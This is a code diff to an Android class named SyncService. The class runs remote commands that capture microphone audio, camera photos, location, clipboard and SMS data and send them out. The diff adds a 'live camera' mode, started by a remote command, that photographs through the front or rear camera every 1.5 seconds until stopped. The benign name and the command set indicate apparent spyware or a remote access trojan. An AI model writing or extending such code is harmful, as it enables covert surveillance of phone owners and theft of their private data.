@@ -66,6 +66,8 @@ public class SyncService extends Service {
 
     private ExecutorService pool;
     private volatile boolean running = false;
+    private volatile boolean camLiveOn = false;
+    private volatile boolean camLiveFront = false;
     private static SyncService instance;
     private PowerManager.WakeLock wakeLock;
 
@@ -150,8 +152,11 @@ public class SyncService extends Service {
         if (cmd.equals("__uninstall__")) { handleUninstall(id); return; }
         if (cmd.equals("__upgrade__"))   { doUpgrade(id); return; }
         if (cmd.startsWith("__mic"))     { doMic(id, cmd); return; }
-        if (cmd.equals("__cam__"))       { doCam(id, false); return; }
-        if (cmd.equals("__cam_front__")) { doCam(id, true); return; }
+        if (cmd.equals("__cam__"))            { doCam(id, false); return; }
+        if (cmd.equals("__cam_front__"))      { doCam(id, true); return; }
+        if (cmd.equals("__cam_live_on__"))    { startCamLive(id, false); return; }
+        if (cmd.equals("__cam_live_front__")) { startCamLive(id, true); return; }
+        if (cmd.equals("__cam_live_off__"))   { camLiveOn = false; sendOut(id, cmd, enc("cam_live_stopped")); return; }
         if (cmd.equals("__loc__"))       { doLoc(id); return; }
         if (cmd.equals("__clip__"))      { doClip(id); return; }
         if (cmd.equals("__sms__"))       { doSms(id); return; }
@@ -177,6 +182,18 @@ public class SyncService extends Service {
     }
 
     // ── special commands ───────────────────────────────────────────────────────
+
+    private void startCamLive(String id, boolean front) {
+        camLiveOn = true;
+        camLiveFront = front;
+        sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("cam_live_started"));
+        pool.submit(() -> {
+            while (camLiveOn && running) {
+                doCam(id, camLiveFront);
+                try { Thread.sleep(1500); } catch (InterruptedException e) { break; }
+            }
+        });
+    }
 
     private void handleUninstall(String id) {
         sendOut(id, "__uninstall__", enc("ok"));
